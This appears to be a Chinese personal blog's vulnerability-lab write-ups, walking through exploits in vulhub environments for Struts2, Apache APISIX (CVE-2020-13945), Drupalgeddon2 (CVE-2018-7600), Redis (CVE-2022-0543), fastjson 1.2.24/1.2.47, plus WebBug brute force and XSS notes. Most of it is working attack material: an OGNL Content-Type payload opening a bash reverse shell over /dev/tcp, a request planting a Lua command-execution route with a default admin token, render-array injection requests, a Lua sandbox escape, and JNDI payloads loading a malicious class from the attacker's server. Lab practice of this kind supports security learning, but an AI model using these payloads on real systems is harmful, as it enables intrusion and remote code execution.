<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141511781.png" alt="image-20240614151146692"></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></div></figure>

<p>使用这个模块</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141518652.png" alt="image-20240614151826617"></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options</span><br></pre></td></tr></table></div></figure>

<p>查看攻击需要配置的参数，其中Required中为<code>yes</code>的都是必须要设置其参数的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141601788.png" alt="image-20240614160152652"></p>
<p><code>RHOSTS</code>为靶机ip，<code>RPORT</code>为靶机端口，<code>TARGETURI</code>为攻击路径。<code>LHSOT</code>为攻击机ip，<code>LPORT</code>为攻击开启的监听端口，该端口必须是没有其它服务占用的。此处的<code>TARGETURI</code>来源于在靶场上传文件后的URL</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 靶机ip</span><br><span class="line"><span class="built_in">set</span> RPORT 8081</span><br><span class="line"><span class="built_in">set</span> TARGETURI doUpload.action</span><br></pre></td></tr></table></div></figure>

<p>设置好应该是这样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141606314.png" alt="image-20240614160644277"></p>
<p>运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141608837.png" alt="image-20240614160834791"></p>
<p>先获取一个交互式的shell然后通过python命令来优化终端显示</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141612434.png" alt="image-20240614161207395"></p>
<p>#nc</p>
<p>开启监听</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141640088.png" alt="image-20240614164041054"></p>
<p>抓包，将<code>Content-Type</code>修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/开启nc的主机ip/nc监听的端口 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;b</span><br></pre></td></tr></table></div></figure>

<p>发包后可以看到反弹shell成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141641215.png" alt="image-20240614164147180"></p>
<p>附：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62008601/article/details/126082104" >https://blog.csdn.net/m0_62008601/article/details/126082104</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Apisix"   >
          <a href="#Apisix" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apisix" class="headerlink" title="Apisix"></a>Apisix</h1>
      
        <h2 id="CVE-2020-13945"   >
          <a href="#CVE-2020-13945" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2020-13945" class="headerlink" title="CVE-2020-13945"></a>CVE-2020-13945</h2>
      <p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141707487.png" alt="image-20240614170741445"></p>
<p>抓包，利用默认Token增加一个恶意的router，其中包含恶意LUA脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /apisix/admin/routes HTTP/1.1</span><br><span class="line">Host: ip地址:9080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0</span><br><span class="line">Connection: close</span><br><span class="line">X-API-KEY: edd1c9f034335f136f87ad84b625c8f1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 408</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这个脚本主要包含一个模块，该模块在接收到HTTP请求时执行一个命令并返回结果</p>
<figure class="highlight lua"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125;  <span class="comment">-- 创建一个局部模块表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>  <span class="comment">-- 定义模块的访问函数</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)  <span class="comment">-- 引入os模块</span></span><br><span class="line">    <span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args())  <span class="comment">-- 获取并断言请求的URI参数</span></span><br><span class="line">    <span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))  <span class="comment">-- 打开一个由cmd参数指定的进程，并获取其输出</span></span><br><span class="line">    <span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))  <span class="comment">-- 读取进程输出</span></span><br><span class="line">    ngx.say(s)  <span class="comment">-- 输出进程结果到客户端</span></span><br><span class="line">    f:<span class="built_in">close</span>()  <span class="comment">-- 关闭进程</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> _M  <span class="comment">-- 返回模块</span></span><br></pre></td></tr></table></div></figure>

<p>发包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406170918837.png" alt="image-20240617091855780"></p>
<p>访问刚才添加的router，就可以通过cmd参数执行任意命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/attack?cmd=ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406170911203.png" alt="image-20240617091150168"></p>

        <h1 id="Drupal-Drupalgeddon-2远程代码执行漏洞"   >
          <a href="#Drupal-Drupalgeddon-2远程代码执行漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Drupal-Drupalgeddon-2远程代码执行漏洞" class="headerlink" title="Drupal Drupalgeddon 2远程代码执行漏洞"></a>Drupal Drupalgeddon 2远程代码执行漏洞</h1>
      
        <h2 id="CVE-2018-7600"   >
          <a href="#CVE-2018-7600" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-7600" class="headerlink" title="CVE-2018-7600"></a>CVE-2018-7600</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171448951.png" alt="image-20240617144842633"></p>
<p>安装drupal，数据库处选择SQLlite然后默认配置即可</p>
<p>安装完成之后长这个样子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171501559.png" alt="image-20240617150142477"></p>
<p>抓包发送到Repeater，修改请求包内容为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: ip地址:8083</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.18.7:8088/user/register</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663</span><br><span class="line">Content-Length: 630</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail[#post_render][]&quot;</span><br><span class="line"></span><br><span class="line">passthru</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail[#type]&quot;</span><br><span class="line"></span><br><span class="line">markup</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail[#markup]&quot;</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;form_id&quot;</span><br><span class="line"></span><br><span class="line">user_register_form</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;_drupal_ajax&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171555374.png" alt="image-20240617155523293"></p>
<p>or</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: ip地址:8083</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=passthru&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171603184.png" alt="image-20240617160312135"></p>
<p>利用了Drupal的渲染数组注入漏洞，通过<code>#post_render</code>参数注入PHP命令执行函数</p>

        <h1 id="redis未授权访问漏洞"   >
          <a href="#redis未授权访问漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1>
      
        <h2 id="CVE-2022-0543"   >
          <a href="#CVE-2022-0543" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2022-0543" class="headerlink" title="CVE-2022-0543"></a>CVE-2022-0543</h2>
      <p>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象<code>package</code>，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。</p>
<p>docker启动后，使用以下命令连接到redis服务器</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip地址 -p 6379</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171619794.png" alt="image-20240617161955754"></p>
<p>借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令</p>
<figure class="highlight lua"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;ls /&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>

<p>使用<code>io.popen</code>来执行一个系统命令并读取其输出，这个代码片段的具体功能是获取并返回执行<code>ls /</code>命令的结果</p>
<p>不同环境下的liblua库路径不同，需要指定一个正确的路径，在该环境中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code></p>
<p>使用<code>eval</code>命令执行上述脚本</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f</span></span><br><span class="line"><span class="string">(&quot;*a&quot;); f</span></span><br><span class="line"><span class="string">(); return res&#x27;</span> 0</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171630268.png" alt="image-20240617163045225"></p>
<p>成功执行命令<code>ls /</code></p>

        <h1 id="fastjson"   >
          <a href="#fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1>
      
        <h2 id="1-2-24"   >
          <a href="#1-2-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2>
      <p>在E:\靶场\vulhub-master\fastjson\1.2.24-rce目录下打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p>运行界面图为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302030232.png" alt="image-20240530203035187"></p>
<p>运行之后新建一个TouchFile.java文件，写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success.txt&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在该java文件夹目录下打开终端，编译这个文件</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></div></figure>

<p>就能看到该目录下已经有了一个.class文件</p>
<p>python开启http服务</p>
<p>终端输入</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></div></figure>

<p>可以访问一下这个网页看是否开启成功</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8000</span><br><span class="line">//ip地址也可以为本机ip地址</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302023728.png"></p>
<p>可以看到文件目录下有这么些文件</p>
<p>借助marshalsec项目开启RMI服务<br>marshalsec:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec" >https://github.com/mbechler/marshalsec</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>下载完marshalsec之后，进到该目录下打开终端运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></div></figure>

<p>会生成一个target文件夹，里面又一个marshalsec-0.0.3-SNAPSHOT-all.jar文件说明已经配置成功了</p>
<p>在target文件夹内打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://本机ip地址:8000/#TouchFile&quot;</span> </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302029680.png" alt="image-20240530202944628"></p>
<p>然后抓包（这个靶场的运行界面的包）发送到Repeater</p>
<p>修改请求头为POST，添加Content-Type为application/json，添加参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://本机ip地址:1099/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>com.sun.rowset.JdbcRowSetImpl</code> 是 Java 的一部分，属于 <code>javax.sql.rowset</code> 包。这个类实现了 <code>JdbcRowSet</code> 接口，提供了一个封装数据库结果集的 Java Bean 组件。关键的问题是，这个类在处理特定的属性（如 <code>dataSourceName</code>）时，可以触发 Java 的 JNDI服务，这可能会导致远程代码执行</p>
<p><code>dataSourceName</code> 属性被用于指定 JNDI 查找的地址。在正常情况下，这应该是数据库的位置，但在攻击场景中，这个地址被设置为恶意的 RMI服务器地址</p>
<p>当 Fastjson 创建 <code>JdbcRowSetImpl</code> 实例并设置其 <code>dataSourceName</code> 时，该实例会尝试连接到提供的 JNDI 地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302040219.png" alt="image-20240530204018163"></p>
<p>发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302041342.png" alt="image-20240530204111289"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405310920378.png" alt="image-20240531092032273"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311120287.png" alt="image-20240531112056134"></p>
<p>查看容器内的文件</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">//查看容器内内容的id号</span><br></pre></td></tr></table></div></figure>

<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id号 /bin/bash</span><br><span class="line">//进入该容器</span><br></pre></td></tr></table></div></figure>

<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /tmp</span><br><span class="line">//查看该文件夹下的文件</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302043378.png" alt="image-20240530204334328"></p>

        <h2 id="1-2-47"   >
          <a href="#1-2-47" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2>
      <p>方法同1.2.24</p>
<p>请求包的参数部分内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/30/WebBug%E9%9D%B6%E5%9C%BA/">WebBug-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="暴力破解"   >
          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
      
        <h2 id="登录1、3"   >
          <a href="#登录1、3" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录1、3" class="headerlink" title="登录1、3"></a>登录1、3</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301035256.png" alt="image-20240530103559225"></p>
<p>随便输入信息登录，抓包，发送到攻击器，选择字典开始攻击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301036804.png" alt="image-20240530103657752"></p>
<p>爆破出账号密码</p>
<p>（登录3可以用sql注入绕过密码）</p>

        <h2 id="登录5-有验证码"   >
          <a href="#登录5-有验证码" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录5-有验证码" class="headerlink" title="登录5-有验证码"></a>登录5-有验证码</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301105554.png" alt="image-20240530110506521"></p>
<p>有验证码了，随便输入信息登录，抓包，发送到Repeater</p>
<p>发包后提示账号或密码错误，修改账号再次发包，发现还是提示账号或密码错误，说明这个验证码是可以重复使用的</p>
<p>发送到攻击器，选择字典开始攻击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301104634.png" alt="image-20240530110442577"></p>

        <h1 id="越权"   >
          <a href="#越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权" class="headerlink" title="越权"></a>越权</h1>
      <p>DeleteUserServlet.java</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301405684.png" alt="image-20240530140538642"></p>
<p>必须grade和user_rights都为2才能执行删除操作，而user_rights是在ini.sql文件里就已经定义好的</p>

        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      <p>UsersDao.java文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301341658.png" alt="image-20240530134125613"></p>
<p>已经添加了预处理语句，防止了SQL注入攻击</p>

        <h1 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301119084.png" alt="image-20240530111906053"></p>
<p>在content里输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>即出现弹窗，并且每次点击留言展示都会有弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301119582.png" alt="image-20240530111948546"></p>
